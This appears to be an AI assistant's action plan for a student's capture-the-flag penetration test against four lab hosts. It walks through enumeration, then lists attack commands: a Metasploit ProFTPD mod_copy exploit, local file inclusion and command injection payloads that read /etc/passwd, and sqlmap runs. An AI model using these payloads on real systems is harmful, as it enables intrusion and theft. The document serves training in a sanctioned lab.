# Next Steps - Penetration Testing Guide

## 📋 Summary

I've analyzed your nmap scan results and created a comprehensive penetration testing toolkit for your CTF challenge. Since I'm running in a containerized environment without direct access to the 10.12.0.0/24 network, you'll need to execute these commands from your **Kali box** that has network connectivity to the targets.

---

## ✅ Current Status

**Flags Found: 1/12 (8.33%)**

- ✅ **10.12.0.136 - Flag 1:** CSEC-3961-QOTD (from QOTD service on port 17)
- ❌ **Remaining:** 11 flags across 4 systems

---

## 📁 Files Created

I've created the following resources in `/workspace/`:

1. **`PenetrationTestingReport.md`** - Comprehensive analysis of all 4 target systems
2. **`exploitation_strategies.md`** - Detailed exploitation paths for each target
3. **`enumeration_commands.sh`** - Automated enumeration script you can run
4. **`quick_reference_commands.md`** - Quick reference for common pentesting commands

---

## 🚀 Recommended Action Plan

### PHASE 1: Automated Enumeration (Run First)

From your Kali box, execute the enumeration script:

```bash
cd /workspace
chmod +x enumeration_commands.sh
./enumeration_commands.sh
```

This will:
- Run `gobuster` on all web servers to find hidden directories
- Run `nikto` to scan for web vulnerabilities
- Test FTP anonymous access on 10.12.0.42
- Enumerate SMB shares on 10.12.0.111
- Interact with legacy services on 10.12.0.136
- Search for exploits in searchsploit

**Expected Runtime:** 5-10 minutes

---

### PHASE 2: Manual Web Investigation (High Priority)

While the script runs, manually browse each web server:

**10.12.0.42 (nginx):**
```bash
firefox http://10.12.0.42 &
```

**10.12.0.111 (IIS on two ports):**
```bash
firefox http://10.12.0.111 &
firefox http://10.12.0.111:8080 &
```

**10.12.0.194 (Apache):**
```bash
firefox http://10.12.0.194 &
```

**Look for:**
- Flag files directly accessible
- Login pages
- File upload forms
- Directory listings
- Error messages revealing information
- Forms to test for SQLi, XSS, command injection

---

### PHASE 3: Review Enumeration Results

Check the results directory created by the script:

```bash
cd ~/pentest_results_$(date +%Y%m%d)
ls -la

# Check for interesting findings
cat gobuster_*.txt | grep -E "(200|301|302)"
cat nikto_*.txt | grep -v "0 error"
cat smb_shares_*.txt
cat ftp_*.txt
```

---

### PHASE 4: Targeted Exploitation

Based on enumeration results, proceed with exploitation:

#### Priority 1: Web Server Directories
If gobuster found interesting directories:
```bash
# Browse to each discovered directory
firefox http://10.12.0.42/[discovered_directory]
```

#### Priority 2: FTP on 10.12.0.42
If anonymous FTP works:
```bash
ftp 10.12.0.42
# user: anonymous
# pass: anonymous
ls -la
get flag.txt
```

Or test ProFTPD exploit:
```bash
msfconsole
use exploit/unix/ftp/proftpd_modcopy_exec
set RHOSTS 10.12.0.42
set SITEPATH /var/www/html
exploit
```

#### Priority 3: SMB Shares on 10.12.0.111
If shares are accessible:
```bash
smbclient //10.12.0.111/[discovered_share] -N
ls
get flag.txt
```

#### Priority 4: Web Application Testing
Test for common vulnerabilities:

**Local File Inclusion:**
```bash
curl "http://TARGET/index.php?page=../../../../etc/passwd"
```

**SQL Injection:**
```bash
sqlmap -u "http://TARGET/page.php?id=1" --batch --dbs
```

**Command Injection:**
```bash
curl "http://TARGET/ping.php?ip=127.0.0.1;cat%20/etc/passwd"
```

---

## 🎯 Target-Specific Quick Wins

### 10.12.0.42 (Linux - ProFTPD)
**Most Likely Flag Locations:**
1. Anonymous FTP access with flag.txt
2. ProFTPD mod_copy exploit to copy files to web directory
3. Web application with LFI/RFI

**Quick Test:**
```bash
ftp 10.12.0.42
# Try: anonymous/anonymous
```

### 10.12.0.111 (Windows - IIS/SMB)
**Most Likely Flag Locations:**
1. Publicly accessible web directory
2. Readable SMB share
3. Web application vulnerability

**Quick Test:**
```bash
smbclient -L //10.12.0.111 -N
curl http://10.12.0.111/flag.txt
curl http://10.12.0.111:8080/flag.txt
```

### 10.12.0.136 (Windows - Legacy Services)
**Most Likely Flag Locations:**
1. ✅ Port 17 QOTD (already found)
2. Other legacy services (ports 7, 9, 13, 19)
3. Hidden 3rd party vulnerable service (per hint)

**Quick Test:**
```bash
# Test other legacy services
echo "GET FLAG" | nc 10.12.0.136 7
nc 10.12.0.136 13
nc 10.12.0.136 19 | head -100

# Full port scan to find 3rd party service
nmap -p- 10.12.0.136 -oN fullscan_136.txt
```

### 10.12.0.194 (Linux - Apache)
**Most Likely Flag Locations:**
1. Web directory with flag.txt
2. Web application vulnerability (LFI, SQLi, RCE)
3. Misconfigured Apache

**Quick Test:**
```bash
curl http://10.12.0.194/flag.txt
curl http://10.12.0.194/robots.txt
curl http://10.12.0.194/index.php?page=../../../../etc/passwd
```

---

## 🔍 Troubleshooting

### If enumeration script fails:
Make sure you have required tools installed:
```bash
sudo apt update
sudo apt install -y gobuster nikto smbclient ftp netcat
```

### If you can't connect to targets:
Verify network connectivity:
```bash
ping -c 3 10.12.0.42
ip addr show  # Make sure you're on the right network
```

### If all web servers time out:
They might be blocking your IP or rate limiting. Try:
```bash
# Slower scan
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt --delay 100ms

# Different user agent
curl -A "Mozilla/5.0" http://TARGET
```

---

## 📝 Notes & Reminders

1. **One Exploit Rule:** Remember, each exploit can only be used ONCE across all flags
2. **Document Everything:** Keep detailed notes of what you try
3. **Be Careful:** Don't lock yourself out or break systems
4. **Time Management:** If stuck >1 hour on one flag, move to another or ask for hint
5. **Bonus Points:** Look for alternative methods to compromise systems

---

## 🎓 Learning Resources

If you need help with specific techniques:

- **Web Application Testing:** Check `quick_reference_commands.md` for LFI, SQLi, etc.
- **FTP Exploitation:** See `exploitation_strategies.md` for ProFTPD details
- **SMB Enumeration:** Reference `quick_reference_commands.md` for enum4linux
- **Privilege Escalation:** Both documents have Linux and Windows privesc guides

---

## 🚨 What to Do When You Find a Flag

1. **Document the flag** and how you found it
2. **Take screenshots** of the process
3. **Note the exploit/technique** used (remember: can't reuse!)
4. **Update your progress** in `PenetrationTestingReport.md`

Flag format appears to be: `CSEC-3961-XXXX` or similar `flag.txt` files

---

## ✉️ When to Ask for Help

Ask your instructor for a hint if:
- Stuck on one flag for more than 1 hour
- Exhausted all enumeration options
- Need clarification on the "one exploit" rule
- Made a mistake and locked yourself out

**When asking, provide:**
- Target system IP
- Which flag you're attempting (1, 2, or 3)
- What you've already tried
- Enumeration results

---

## 🎯 Success Metrics

- **Phase 1 Complete:** All enumeration scripts run successfully
- **Phase 2 Complete:** All web servers manually inspected
- **Phase 3 Complete:** 4+ flags found (33%)
- **Phase 4 Complete:** 8+ flags found (67%)
- **Phase 5 Complete:** 12/12 flags found (100%)

---

## Good luck! 🍀

Start with the automated enumeration script, review the results, and then dive into manual testing. The first few flags should come relatively quickly from enumeration. The later flags will require exploitation and privilege escalation.

**Remember:** Work systematically, document everything, and don't hesitate to ask for hints if you're truly stuck.

You've got this! 💪
